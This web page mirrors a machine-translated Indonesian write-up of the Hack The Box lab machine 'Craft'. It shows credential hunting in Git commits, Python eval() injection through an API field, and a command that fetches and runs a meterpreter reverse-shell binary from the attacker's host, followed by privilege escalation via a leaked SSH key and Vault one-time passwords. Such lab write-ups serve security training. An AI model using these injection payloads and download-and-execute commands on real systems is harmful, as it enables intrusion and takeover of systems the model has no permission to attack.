<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>😸 🐽 😚 Hack The Box - Walkthrough Craft. Kami menggali Git, mengeksploitasi kerentanan dalam API, berurusan dengan Vault 👩🏻‍🎓 🕵️ 👨🏿‍🎤</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Pada artikel ini, saya akan mulai menerbitkan solusi yang dikirim untuk diproses lebih lanjut dari situs HackTheBox . Saya berharap ini akan membantu ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Hack The Box - Walkthrough Craft. Kami menggali Git, mengeksploitasi kerentanan dalam API, berurusan dengan Vault</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/482970/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/z4/tn/ez/z4tnezybmcfihio9svzufxldfxq.png" alt="gambar"></div><br>  Pada artikel ini, saya akan mulai menerbitkan solusi yang dikirim untuk <a href="https://www.hackthebox.eu/" rel="nofollow">diproses lebih lanjut</a> dari situs <a href="https://www.hackthebox.eu/" rel="nofollow">HackTheBox</a> .  Saya berharap ini akan membantu setidaknya seseorang untuk berkembang di bidang keamanan informasi.  Kami akan melihat bagaimana Anda dapat mengeksploitasi RCE di API, mempelajari repositori Gogs, bekerja dengan basis data, dan menangani penyimpanan rahasia dan sistem manajemen Vault. <br><br>  Koneksi ke laboratorium adalah melalui VPN.  Dianjurkan untuk tidak terhubung dari komputer kerja atau dari host di mana data penting bagi Anda tersedia, karena Anda berakhir di jaringan pribadi dengan orang-orang yang mengetahui sesuatu di bidang keamanan informasi :) <br><br><div class="spoiler">  <b class="spoiler_title">Informasi Organisasi</b> <div class="spoiler_text">  Terutama bagi mereka yang ingin mempelajari sesuatu yang baru dan berkembang di bidang informasi dan keamanan komputer, saya akan menulis dan berbicara tentang kategori berikut: <br><br><ul><li>  PWN; </li><li>  kriptografi (Crypto); </li><li>  teknologi jaringan (Jaringan); </li><li>  membalikkan (Reverse Engineering); </li><li>  steganografi (Stegano); </li><li>  pencarian dan eksploitasi kerentanan WEB. </li></ul><br>  Selain itu, saya akan membagikan pengalaman saya dalam forensik komputer, analisis malware dan firmware, serangan pada jaringan nirkabel dan jaringan area lokal, melakukan pentest dan menulis eksploitasi. <br><a name="habracut"></a><br>  Agar Anda dapat mengetahui tentang artikel baru, perangkat lunak, dan informasi lainnya, saya membuat <a href="https://t.me/RalfHackerChannel" rel="nofollow">saluran di Telegram</a> dan <a href="https://t.me/RalfHackerPublicChat" rel="nofollow">grup untuk membahas masalah apa pun</a> di bidang ICD.  Juga, saya pribadi akan mempertimbangkan permintaan pribadi Anda, pertanyaan, saran dan rekomendasi <a href="https://t.me/hackerralf8" rel="nofollow">secara pribadi dan akan menjawab semua orang</a> . <br><br>  Semua informasi disediakan hanya untuk tujuan pendidikan.  Penulis dokumen ini tidak bertanggung jawab atas kerusakan yang disebabkan seseorang sebagai akibat dari menggunakan pengetahuan dan metode yang diperoleh sebagai hasil dari mempelajari dokumen ini. <br></div></div><br><h2>  Kecerdasan </h2><br><h3>  Pemindaian port </h3><br>  Mesin ini memiliki alamat IP 10.10.10.110, yang saya tambahkan ke / etc / hosts. <br> <code>10.10.10.110 craft.htb</code> <br>  Pertama-tama, kami memindai port terbuka menggunakan nmap, dan menentukan opsi -A untuk mendapatkan informasi sebanyak mungkin tentang layanan yang ditemukan. <br><pre> <code class="bash hljs">nmap -A craft.htb</code> </pre> <br><img src="https://habrastorage.org/webt/bm/oe/-0/bmoe-0yy3psiltb1fqoqwleakbw.png" alt="gambar"><br><br>  Pada mesin, kita melihat layanan ssh, serta server web yang berjalan pada port 443.  Jika Anda pergi ke server web, maka kami ditawari untuk melihat API. <br><br><img src="https://habrastorage.org/webt/s9/ju/wv/s9juwver3cyta7lvimc36oovys8.png" alt="gambar"><br><br>  Ketika kami mencoba melihat API dan git, kami diberitahu tentang situs yang tidak dikenal. <br><br><img src="https://habrastorage.org/webt/fs/n8/gd/fsn8gdkxcjagfcxrrrdcjblxrwi.png" alt="gambar"><br><br>  Oleh karena itu, kami menambahkan kedua nama domain ke / etc / hosts. <br> <code>10.10.10.110 api.craft.htb <br> 10.10.10.110 gogs.craft.htb</code> <br> <br>  Sekarang kedua tautan terbuka.  API Kerajinan seharusnya merupakan antarmuka untuk bekerja dengan API, jadi sebagai permulaan kita perlu mengetahui cara kerjanya, Gogs mana yang akan membantu kita. <br><br><img src="https://habrastorage.org/webt/3k/tf/6s/3ktf6sictzsrvx8exye1ztl8clo.png" alt="gambar"><br><br><h2>  Titik masuk </h2><br>  Pada git, hal pertama yang harus diperiksa adalah commit. <br><br><img src="https://habrastorage.org/webt/gn/et/od/gnetodmhksh0te2su6k7g4iagt4.png" alt="gambar"><br><br>  Setelah melewati komit, di 10e3ba4f0a kami menemukan data otentikasi pengguna. <br><br><img src="https://habrastorage.org/webt/et/go/ep/etgoephnl29pzvauktdgc3bnqdg.png" alt="gambar"><br><br>  Setelah masuk ke gogs dalam korespondensi, kami menemukan penyebutan tentang bug. <br><br><img src="https://habrastorage.org/webt/kd/ef/ce/kdefcetbxjiwprf5obkroiskq9k.png" alt="gambar"><br><br>  Dengan mengklik tautan, kami mengetahui bagaimana verifikasi terjadi pada fungsi eval (), yang sangat berbahaya, karena Anda dapat mengeksekusi kode dalam fungsi ini. <br><br><img src="https://habrastorage.org/webt/dw/qo/c4/dwqoc4tub5lu285z6d732edka1e.png" alt="gambar"><br><br>  Untuk menguji hipotesis, di konsol python lokal kita akan membuat analog dari fungsi, dan mencoba memanggil fungsi "sistem ()" dari modul "os". <br><br><img src="https://habrastorage.org/webt/yk/xv/jt/ykxvjtizcdg0sb3dtoo9ssrxzqm.png" alt="gambar"><br><br>  Kode berhasil dieksekusi!  Sekarang Anda perlu menulis exploit untuk dapat kembali terhubung.  Pada tahap pertama, salin kode untuk otentikasi dan penerimaan token. <br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python import requests import json response = requests.get('https://api.craft.htb/api/auth/login', auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False) json_response = json.loads(response.text) token = json_response['token'] headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json' } # make sure token is valid response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False) print(response.text) # create a sample brew with bogus ABV... should fail. print("Create bogus ABV brew") brew_dict = {} brew_dict['abv'] = '15.0' brew_dict['name'] = 'bullshit' brew_dict['brewer'] = 'bullshit' brew_dict['style'] = 'bullshit' json_data = json.dumps(brew_dict) response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False) print(response.text)</span></span></code> </pre> <br>  Dalam kode ini, beban kita dilewatkan dalam parameter "abv", jadi untuk memeriksa asumsi RCE kita mengganti string '15 .0 'dengan "__import __ (' os '). System (' ping your_ip ')". <br><br>  Kami membuka tcpdump, yang menunjukkan antarmuka mana untuk mendengarkan dan memfilter parameter hanya paket ICMP dan meluncurkan exploit. <br><br><img src="https://habrastorage.org/webt/h3/lu/8q/h3lu8q3bzjdbzbd72cokrtf7yzk.png" alt="gambar"><br><br><img src="https://habrastorage.org/webt/gs/_e/pg/gs_epgjam_0e5quilzxyybw2ngg.png" alt="gambar"><br><br>  Kami mengamati bahwa kami dapat melakukan ping dari host jarak jauh.  Sekarang kita membuang koneksi kembali.  Itu bisa dilakukan melalui nc, tapi mari kita ambil shell meterpreter.  Untuk melakukan ini, buat beban menggunakan msfvenom.  Kami menentukan beban itu sendiri (reverse_tcp), host lokal dan port (LHOST, LPORT), dan format file elf. <br><br><img src="https://habrastorage.org/webt/hz/hh/cb/hzhhcbcjpz6d8u4kfdntcltgffm.png" alt="gambar"><br><br>  Pada saat yang sama kami mengaktifkan server web lokal.  Sekarang konfigurasikan pendengar di msfconsole.  Untuk melakukan ini, atur parameter, seperti pada beban. <br><br><img src="https://habrastorage.org/webt/im/op/f-/imopf-po-e3tqp9uebbey-5mj9u.png" alt="gambar"><br><br>  Kami mendengarkan koneksi yang masuk, sekarang kami perlu memuat beban pada host dan memulainya. <br> <code>brew_dict['abv'] = 'wget http://10.10.14.199/shell.bin ; chmod +x shell.bin ; ./shell.bin'</code> <br>  Di jendela metasplit, kita melihat koneksi masuk. <br><br><img src="https://habrastorage.org/webt/-b/ji/uw/-bjiuwp51-ibbggge9ifjibpk44.png" alt="gambar"><br><br><h2>  PENGGUNA </h2><br>  Ayo luncurkan shell dan lihat siapa yang bekerja di bawah. <br><br><img src="https://habrastorage.org/webt/gk/0v/nb/gk0vnbephoxohkfkryxl8rjkw64.png" alt="gambar"><br><br>  Menurut kesimpulan terminal, kita dapat mengasumsikan bahwa kita berada di dalam wadah buruh pelabuhan.  Lihatlah tuan rumah. <br><br><img src="https://habrastorage.org/webt/vt/kf/vy/vtkfvyttw0pm6cu9fu622bph25s.png" alt="gambar"><br><br>  Ada file executable dbtest.py.  Anda harus menontonnya. <br><br><img src="https://habrastorage.org/webt/z3/bx/px/z3bxpx73m7ryxf0bwx9a_iiohla.png" alt="gambar"><br><br>  Program terhubung ke database dan menjalankan perintah dengan output selanjutnya.  Mari kita lihat-lihat database.  Untuk melakukan ini, saya meluncurkan konsol python interaktif pada host dan menyalin semua kode ke dalamnya sebelum perintah dijalankan. <br><br><img src="https://habrastorage.org/webt/8u/cr/6g/8ucr6g8pnav_tlmssc-4fezkddu.png" alt="gambar"><br><br>  Sekarang kami akan meminta tabel. <br><br><img src="https://habrastorage.org/webt/ni/dk/zz/nidkzzk_6l1cxsmepos8e3ivbr0.png" alt="gambar"><br><br>  Akibatnya, kami mengembalikan 2 catatan.  Karena cursor.fetchone () menampilkan satu entri, kami akan melakukan dua keluaran seperti itu. <br><br><img src="https://habrastorage.org/webt/jt/vl/wl/jtvlwlt2deghbovntbgholk9okk.png" alt="gambar"><br><br>  Jadi kami punya 2 meja.  Lebih menarik adalah pengguna.  Kami menampilkan semua data dari tabel ini. <br><br><img src="https://habrastorage.org/webt/ui/hz/-_/uihz-_dr6zswnlw-56fgk2mfsv8.png" alt="gambar"><br><br>  Dan ada 3 entri di dalamnya. <br><br><img src="https://habrastorage.org/webt/vn/1b/ld/vn1bldjjzns-pr_bnkakr_-zwcm.png" alt="gambar"><br><br>  Dan kami mendapat kredit pengguna.  Setelah mencobanya di ssh dan gagal kami mencoba masuk ke git.  Dan ternyata masuk sebagai gilfoyle.  Dan dia memiliki repositori tertutup. <br><br><img src="https://habrastorage.org/webt/my/wg/bb/mywgbbpurqlg0eussi8i8a1cico.png" alt="gambar"><br><br><img src="https://habrastorage.org/webt/tp/g8/0h/tpg80hngu3h9tqyvtvdjxm7ogek.png" alt="gambar"><br><br>  Direktori .ssh sangat menarik.  Ada dua kunci, dan kami mengambil yang pribadi. <br><br><img src="https://habrastorage.org/webt/gb/rl/hq/gbrlhqduihwomlm6ed3kkqbozms.png" alt="gambar"><br><br>  Kami mencoba terhubung melalui ssh dengan kunci ini. <br><br><img src="https://habrastorage.org/webt/d5/qg/lm/d5qglmkwzmowjqsjwk-w3iofnl4.png" alt="gambar"><br><br><h2>  ROOT </h2><br>  Hal pertama yang dilihat di direktori pengguna. <br><br><img src="https://habrastorage.org/webt/wn/-z/-t/wn-z-tfhmdf043zqv8z42xag-fe.png" alt="gambar"><br><br>  Kami menemukan token dari lemari besi. <br><br><img src="https://habrastorage.org/webt/cb/52/p6/cb52p6sdmtwkylg4ntvprllwlpo.png" alt="gambar"><br><br>  Setelah berurusan dengan <a href="https://www.vaultproject.io/" rel="nofollow">vault</a> , saya akan mengatakan bahwa itu adalah sistem penyimpanan dan manajemen untuk rahasia yang berisi data dalam format kunci / nilai, yang diakses oleh token.  Periksa apakah penyimpanan sudah diatur. <br><br><img src="https://habrastorage.org/webt/b_/nw/ps/b_nwpsqz5ep9dwtiyyzjfljq9tc.png" alt="gambar"><br><br>  Mari kita <a href="https://www.vaultproject.io/docs/commands/secrets/list.html" rel="nofollow">lihat daftar rahasia</a> . <br><br><img src="https://habrastorage.org/webt/z3/kz/3t/z3kz3tsmbxo2abhoyzipuqqpnuu.png" alt="gambar"><br><br>  Jadi, kita melihat bahwa <a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html" rel="nofollow">akses ke ssh telah dikonfigurasi</a> . <br><br><img src="https://habrastorage.org/webt/nl/3c/zw/nl3czwq1rihro8z5s5gavqji74i.png" alt="gambar"><br><br>  Sekarang kita memasukkan kata sandi satu kali yang diberikan kepada kita dan kita berada di sistem sebagai root. <br><br><img src="https://habrastorage.org/webt/_h/7x/s3/_h7xs3eb2-msqjwwvu6gum8exgi.png" alt="gambar"><br><br>  Anda dapat bergabung dengan kami di <a href="https://t.me/RalfHackerChannel" rel="nofollow">Telegram</a> .  Mari kita mengumpulkan komunitas di mana akan ada orang-orang yang berpengalaman dalam banyak bidang TI, maka kita selalu dapat saling membantu dalam masalah TI dan keamanan informasi. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id482970/">https://habr.com/ru/post/id482970/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id482950/index.html">Java: hal-hal yang mungkin tampak aneh bagi pengembang yang berpengalaman</a></li>
<li><a href="../id482956/index.html">Tinjauan WCS 5.2 - Server WebRTC untuk Pengembang Webcast dan Webcam</a></li>
<li><a href="../id482958/index.html">"Aturan pertumbuhan: dari junior ke CTO", abstrak dari webinar oleh Fedor Borshchev</a></li>
<li><a href="../id482960/index.html">Tinjauan Umum WCS 5.2 - Server WebRTC untuk Pengembang Web Siaran Daring dan Video Chat</a></li>
<li><a href="../id482968/index.html">Quarkus - Pandangan Baru Di Cloud Native Java</a></li>
<li><a href="../id482976/index.html">Analisis transaksi anonim dalam perdagangan saham</a></li>
<li><a href="../id482978/index.html">Parser Blockchain dengan 300 baris dalam Python</a></li>
<li><a href="../id482980/index.html">Oracle sendiri menyalin API dari Amazon S3, dan itu tidak masalah</a></li>
<li><a href="../id482986/index.html">Petunjuk langkah demi langkah untuk mengatur pertukaran melalui file antara 1C: Manajemen Perdagangan 11 dan 1C: Akuntansi 3.0</a></li>
<li><a href="../id482988/index.html">The Ember Times - Edisi 129</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>